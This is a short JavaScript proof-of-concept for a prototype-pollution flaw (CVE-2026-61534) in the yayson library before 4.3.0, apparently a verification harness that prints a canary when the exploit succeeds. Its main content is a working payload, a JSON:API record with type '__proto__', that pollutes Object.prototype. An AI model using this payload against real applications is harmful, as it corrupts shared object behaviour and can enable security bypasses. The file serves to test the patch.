// PoC for CVE-2026-61534 — prototype pollution in yayson < 4.3.0
// The Store uses the attacker-controlled JSON:API `type` as a key into its
// plain-object model cache (graph[type][id] = record). A `type` of "__proto__"
// makes graph["__proto__"] resolve to Object.prototype, so the subsequent
// `[id] = record` write lands on Object.prototype, with `id` as the polluted
// property name. On the patched 4.3.0 build the lookup tables are null-proto /
// Map-backed, so no pollution occurs and the canary is never printed.

const POLLUTED_KEY = 'cve_2026_61534_pwned';

// Sanity: the key must NOT already exist on the prototype chain before we run.
const preProbe = {};
if (POLLUTED_KEY in preProbe) {
  // Environment already dirty; refuse to emit a false positive.
  process.exit(0);
}

const yayson = require('yayson');
const lib = typeof yayson === 'function' ? yayson() : (yayson.default ? yayson.default() : yayson);
const Store = lib.Store;

const store = new Store();

// A JSON:API document whose primary resource `type` is "__proto__".
// `id` becomes the polluted property name; `attributes` its value carrier.
store.sync({
  data: {
    type: '__proto__',
    id: POLLUTED_KEY,
    attributes: { hacked: true }
  }
});

// Trigger check: has Object.prototype been polluted as a consequence of sync()?
// On the vulnerable build a brand-new empty object now "inherits" POLLUTED_KEY.
const postProbe = {};
if (POLLUTED_KEY in postProbe && postProbe[POLLUTED_KEY] !== undefined) {
  // Prototype pollution confirmed -> emit the canary as a direct consequence.
  console.log(process.env.POC_CANARY);
}